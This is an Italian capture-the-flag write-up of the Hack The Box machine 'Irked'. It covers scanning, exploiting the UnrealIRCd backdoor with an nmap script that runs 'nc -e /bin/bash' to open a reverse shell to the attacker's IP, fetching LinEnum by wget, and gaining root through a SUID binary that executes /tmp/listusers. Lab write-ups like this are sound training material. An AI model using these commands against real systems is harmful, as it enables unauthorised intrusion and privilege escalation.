**Target: 10.10.10.117**

# INFORMATION GATHERING

lanciamo un primo scan veloce con Nmap
```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# nmap -sC -sV -O 10.10.10.117                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 10:02 EDT
Nmap scan report for 10.10.10.117
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA)
|   2048 752e66bfb93cccf77e848a8bf0810233 (RSA)
|   256 c8a3a25e349ac49b9053f750bfea253b (ECDSA)
|_  256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43112/tcp6  status
|   100024  1          43699/tcp   status
|   100024  1          45837/udp   status
|_  100024  1          58322/udp6  status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/30%OT=22%CT=1%CU=37629%PV=Y%DS=2%DC=I%G=Y%TM=6476022
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.59 seconds

```

Facciamo un scan anche su tutte le porte per vedere se abbiamo altre porte aperte

```bash
|_  100024  1          58322/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
43699/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/30%OT=22%CT=1%CU=30335%PV=Y%DS=2%DC=I%G=Y%TM=647602F
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.08 seconds

```

Ricapitolando abbiamo

[[Port 22 SSH|22]]/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
[[Port 80,443 Web|80]]/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
43699/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

# ENUMERATION

Iniziamo dalla porta 80 
Troviamo un immagine e il codice sorgete ci mostra quanto segue:
```htlm
<img src=irked.jpg>
<br>
<b><center>IRC is almost working!</b></center>
```

Proviamo ed enumerare con Gobuster 

```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# gobuster dir -u 10.10.10.117 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/30 10:13:56 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.117/manual/]
Progress: 12428 / 207644 (5.99%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/05/30 10:15:02 Finished
===============================================================
````

Toriviamo la diretory /manual che non è altro che la documentazione el server Apache HTTP 
Un altro vicolo cieco. Passiamo alle altreporte 
Le porte 22 e 111 che eseguono OpenSSH 6.7p1 e rpcbind 2–4 non sembrano promettenti.
Le porte 6697, 8067 e 65534 eseguono UnrealIRCd.

Cerchiamo su google  UnrealIRCd e vediamo cosa abbiamo

il primo risultato ci rimanda ad uno script nmap per l'esecuzione di un comando backdoor

Vediamo se abbiamo un script nmap che lo verifica
```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# ls -l /usr/share/nmap/scripts/irc-unrealircd-backdoor.nse
```

```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor.nse 10.10.10.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 10:26 EDT
Nmap scan report for 10.10.10.117
Host is up (0.059s latency).

PORT      STATE SERVICE
6697/tcp  open  ircs-u
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
8067/tcp  open  infi-async
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 23.03 seconds

Perfetto la porta 8067 sembra vulnerabile 
```

# GAINING AN INITIAL FOOTHOLD

Ci mettiamo in ascolto con nc
```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

ed eseguiamo quanto segue:

```bash
┌──(root㉿kali)-[/home/kali/htb/irked]
└─# nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.9 4444"  10.10.10.117
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 10:29 EDT
Nmap scan report for 10.10.10.117
Host is up (0.043s latency).

PORT     STATE SERVICE
8067/tcp open  infi-async
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)
```

Otteniamo cosi una shell
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.117] 55623
```

Facciamo un upgrade dalla shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

Prendiamo la flag
```bash
ircd@irked:/home$ ls
djmardov  ircd
ircd@irked:/home$ cd djmardov/
ircd@irked:/home/djmardov$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
ircd@irked:/home/djmardov$ cat user.txt
cat: user.txt: Permission denied
```

non abbiamo i permessi.

# PRIVESC

Scarichiamo LinEnum sulla macchina target
```bash
┌──(root㉿kali)-[/home/kali/tool/PrivEsc/LinEnum]
└─# python -m http.server 80    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


ircd@irked:/$ cd tmp
ircd@irked:/tmp$ wget http://10.10.14.9/LinEnum.sh
--2023-05-30 11:15:00--  http://10.10.14.9/LinEnum.sh
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh          100%[=====================>]  45.54K   139KB/s   in 0.3s   

2023-05-30 11:15:00 (139 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
```

lo Lanciamo e alla voce SUID files troviamo quanto segue:

>I file SUID (Set User ID) sono un'attribuzione speciale dei file in sistemi Unix-like, come Linux. 
  Quando un file viene impostato con il bit SUID, viene eseguito con i privilegi del proprietario del file anziché con i privilegi dell'utente che lo esegue.
  Questo può consentire agli utenti di eseguire determinati programmi con privilegi elevati, 
  anche se normalmente non dispongono di tali privilegi. 

```bash
[-] SUID files:                                                                  -rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                        
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                          
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1                                
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign                                             
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper                       
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4                                                         
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd                                                            
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh                                                             
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail                                                         
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd                                                          
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp                                                           
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at                                                           
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec                                                           
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X                                                                 
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd                                                           
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn                                                             
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser  <------- questo è quello che ci interessa                                                        
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs                                                           
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su                                                                   
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount                                                                
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount                                                           
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g                                                             
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount        
```

Proviamo ad esegurilo per vedere cosa fa:
```bash
ircd@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-05-30 11:02 (:0)
sh: 1: /tmp/listusers: not found
ircd@irked:/usr/bin$
```

Sembra che sia in esecuzione un file /tmp/listusers, tuttavia il file non esiste. 
Poiché il bit SUID è impostato per questo file, verrà eseguito con il livello di privilegio che corrisponde all'utente che possiede il file. 
In questo caso, il file è di proprietà di root, quindi il file verrà eseguito con i privilegi di root.
È nella directory /tmp, a cui abbiamo accesso, quindi creiamo il file e facciamogli eseguire una shell bash.

```bash
ircd@irked:echo "bash" > /tmp/listusers
ircd@irked:/tmp$ chmod 777 listusers 
ircd@irked:/tmp$ cd ..
ircd@irked:/$ cd usr/bin/
ircd@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-05-30 11:02 (:0)
root@irked:/usr/bin# 
```

Flag users

```bash
root@irked:/home/djmardov# cat user.txt 
62cd991173129626216f829ebfbe50c9
```

Flag root

```bash
root@irked:/root# cat root.txt 
a2a05b9126e195301d18882f844c8fb4

root@irked:/root# cat pass.txt 
Kab6h+m+bbp2J:HG

```

# EXTRA CONTENT
```bash
root@irked:/home/djmardov/Documents# ls -la
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt

root@irked:/home/djmardov/Documents# cat .backup 
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
root@irked:/home/djmardov/Documents#
```

sembra essere una sfida stenografica 

Ci creiamo un ambiente virtuale dove scaricare le dipendenze di steghide
```bash
python3 -m venv venv 
```

Questo comando creerà una directory chiamata "venv" che conterrà l'ambiente virtuale.

Attiviamo l'ambiente virtuale con il comando:
```bash
`source venv/bin/activate`
```

una volta attivato l'ambiente viruale isttaliamo steghide
```bash
apt-get install steghide
```

ci scarichiamo l'immagine trovate sulla porta 80 
```bash
┌──(venv)─(root㉿kali)-[/home/kali/htb/irked/venv]
└─# ls
bin  include  irked.jpg  lib  lib64  pyvenv.cfg
```

e con il seguente comando estraimao la password
la passphare mettiamo quella trovara in pass.txt sulla macchina remota
```bash
┌──(venv)─(root㉿kali)-[/home/kali/htb/irked/venv]
└─# steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt".

┌──(venv)─(root㉿kali)-[/home/kali/htb/irked/venv]
└─# cat pass.txt  
Kab6h+m+bbp2J:HG
```

Cosi riusciamo a collegarci trammici ssh come l'utente djmardov
```bash
┌──(venv)─(root㉿kali)-[/home/kali/htb/irked/venv]
└─# ssh djmardov@10.10.10.117     
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ED25519 key fingerprint is SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.117' (ED25519) to the list of known hosts.
ls
djmardov@10.10.10.117's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ 

Ora che abbiamo i privilegi djmardov, possiamo ottenere il file user.txt.
Da lì, dobbiamo aumentare i privilegi utilizzando l'errata configurazione SUID che abbiamo sfruttato sopra.
```

# LESSON LEARNED

Abbiamo sfruttato due vulnerabilità per ottenere l'accesso a livello di root sulla macchina.
Un servizio vulnerabile UnrealIRCd che conteneva una vulnerabilità di esecuzione di comandi backdoor. Questo avrebbe potuto essere facilmente evitato se fosse stata installata la versione con patch.
Un SUID mal configurato che ci ha permesso di aumentare i privilegi. Questo è un vettore di attacco comune. Quando si imposta il flag SUID, gli amministratori devono analizzare attentamente le proprie applicazioni SUID/GUID per determinare se richiedono legittimamente autorizzazioni elevate. Nel mio caso, come utente non privilegiato, avevo i privilegi rwx completi sul file che veniva eseguito da un binario con il bit SUID impostato.
